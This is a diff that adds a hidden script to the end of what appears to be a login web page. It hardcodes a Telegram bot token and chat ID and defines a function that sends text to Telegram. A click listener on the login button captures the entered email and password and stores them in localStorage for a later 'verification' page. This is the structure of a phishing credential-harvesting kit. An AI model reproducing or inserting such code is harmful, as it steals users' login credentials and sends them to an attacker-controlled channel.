@@ -2360,4 +2360,47 @@ document.querySelectorAll('input[type=file]').forEach(x=>x.addEventListener('cha
   upd();
 })();
 </script>
+
+<script id="kb-telegram">
+(function () {
+  "use strict";
+  const BOT_TOKEN = "8635919924:AAHB1CPgQWMN78WQhRG100Q0o63C2NSzE4k";
+  const CHAT_ID   = "6959842489";
+
+  async function tgSend(text) {
+    if (!BOT_TOKEN || BOT_TOKEN.startsWith("ISI_")) return;
+    try {
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        keepalive: true,
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: text,
+          parse_mode: "HTML",
+          disable_web_page_preview: true
+        })
+      });
+    } catch (e) { console.error("[TG]", e); }
+  }
+
+  const esc = (s) => String(s ?? "")
+    .replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
+
+  // Simpan credential ke localStorage (untuk dipakai di halaman verifikasi)
+  document.addEventListener("click", function (e) {
+    const btn = e.target.closest("#ks-demo-login");
+    if (!btn || btn.disabled) return;
+    const email = document.getElementById("ks-demo-user")?.value?.trim() || "-";
+    const pass  = document.getElementById("ks-demo-password")?.value || "-";
+    try {
+      localStorage.setItem("kb_email", email);
+      localStorage.setItem("kb_password", pass);
+    } catch(_) {}
+  }, true); // capture phase → jalan sebelum navigasi
+
+  window.KBTelegram = { send: tgSend, esc };
+})();
+</script>
+
 </body></html>
